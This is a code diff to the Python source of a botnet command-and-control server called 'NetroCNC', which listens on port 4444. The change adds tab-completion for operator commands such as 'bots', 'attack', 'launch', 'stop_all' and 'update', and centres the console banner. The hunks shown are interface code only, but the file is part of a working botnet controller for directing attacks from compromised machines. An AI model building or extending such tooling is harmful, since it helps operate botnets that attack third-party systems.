@@ -1,6 +1,7 @@
 from urllib.parse import urlparse
 from datetime import datetime
 import threading
+import readline
 import socket
 import random
 import string
@@ -497,11 +498,23 @@ def clear_console():
         os.system("clear")
 
 def show_banner():
-    with open(f"{os.path.dirname(__file__)}/cnc_banner.txt", "r") as banner_file:
-        banner = banner_file.read()
-        banner_file.close()
+    with open("cnc_banner.txt", "rb") as file:
+        banner = file.read().decode()
+        file.close()
+    
+    terminal_columns = os.get_terminal_size().columns
+    highest_line = 0
 
-    print(f"{Colors.RED}{banner}{Colors.RESET}\n")
+    for line in banner.splitlines():
+        if len(line) > highest_line:
+            highest_line = len(line)
+    
+    spaces = int((terminal_columns - highest_line) / 2)
+
+    print(Colors.RED)
+    for line in banner.splitlines():
+        print(f"{' ' * spaces}{line}")
+    print(Colors.RESET)
 
 def main():
     clear_console()
@@ -512,6 +525,30 @@ def main():
     netro_cnc = NetroCNC(host="0.0.0.0", port=4444, timeout=10)
     threading.Thread(target=netro_cnc.start, daemon=True).start()
     print(f"Server has initialized. Type \"help\" to show the list of available commands.\n")
+
+    commands_list = [
+        "help",
+        "clear",
+        "bots",
+        "bot_list",
+        "attacks",
+        "attack",
+        "launch",
+        "stop",
+        "stop_all",
+        "update"
+    ]
+
+    def autocomplete_command(text, state):
+        for command in commands_list:
+            if command.startswith(text):
+                if not state:
+                    return command
+                else:
+                    state -= 1
+    
+    readline.parse_and_bind("tab: complete")
+    readline.set_completer(autocomplete_command)
 
     while True:
         full_command = input(">")
